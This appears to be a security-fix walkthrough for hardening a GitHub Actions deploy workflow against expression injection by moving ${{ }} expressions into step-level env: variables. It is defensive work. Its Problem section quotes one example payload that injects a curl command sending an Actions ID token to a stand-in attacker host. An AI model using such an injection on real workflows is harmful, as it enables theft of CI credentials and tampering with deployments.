# Walkthrough: audit-0036 — Harden deploy.yml expression injection

## Summary

Mapped all `${{ }}` GitHub Actions expressions in shell `run:` blocks to step-level `env:` variables throughout `.github/workflows/deploy.yml`. This prevents expression injection attacks where a malicious `inputs.image_tag` value could execute arbitrary shell commands.

## Problem

GitHub Actions evaluates `${{ }}` expressions by string-interpolating them into the shell script text before execution. For `workflow_dispatch` inputs of `type: string` (like `image_tag`), an attacker with repo write access could craft a payload that breaks out of the string context and executes arbitrary commands.

Example malicious input: `"; curl attacker.com/exfil?token=$ACTIONS_ID_TOKEN_REQUEST_TOKEN; echo "`

## Solution

Move all `${{ }}` expressions from inside `run:` script bodies to `env:` blocks at the step level. Environment variables are passed to the shell as actual environment variables (not string-interpolated), so they cannot cause injection regardless of their content.

## Changes

### `.github/workflows/deploy.yml`

| Job | Step | Expressions mapped |
|-----|------|--------------------|
| `prepare` | Resolve deployment parameters | `github.event_name`, `github.event.workflow_run.head_sha`, `github.sha`, `github.ref_name`, `inputs.environment`, `inputs.image_tag` |
| `deploy-apis` | Wait for GHCR image availability | `env.GHCR_REGISTRY`, `github.repository_owner`, `matrix.service`, `needs.prepare.outputs.image_tag` |
| `deploy-apis` | Configure Docker for AR | `vars.GCP_REGION` |
| `deploy-apis` | Deploy to Cloud Run | `needs.prepare.outputs.environment`, `matrix.service`, `vars.*`, `needs.prepare.outputs.image_tag` |
| `deploy-apis` | Get service URL | Same as above |
| `deploy-web` | Configure Docker for AR | `vars.GCP_REGION` |
| `deploy-web` | Deploy to Cloud Run | `needs.prepare.outputs.environment`, `vars.*`, `needs.prepare.outputs.image_tag` |
| `deploy-web` | Get service URL | Same as above |
| `summary` | Write summary | `needs.prepare.outputs.*`, `needs.deploy-apis.result`, `needs.deploy-web.result` |

### What was NOT changed

- `with:` blocks for composite actions (`copy-image-to-ar`, `verify-health`, `docker/build-push-action`) — these are YAML value contexts, not shell contexts, and are not vulnerable to injection.
- `if:` conditions and `environment:` fields — these are expression contexts evaluated by GitHub Actions, not shell.
- `concurrency.group` expression — evaluated by GitHub Actions runtime, not shell.

## Verification

```bash
# YAML syntax check
npx yaml-lint .github/workflows/deploy.yml

# Grep for remaining ${{ }} in run blocks (should return nothing)
# Only env:, with:, if:, and other YAML-level contexts should contain ${{ }}
```
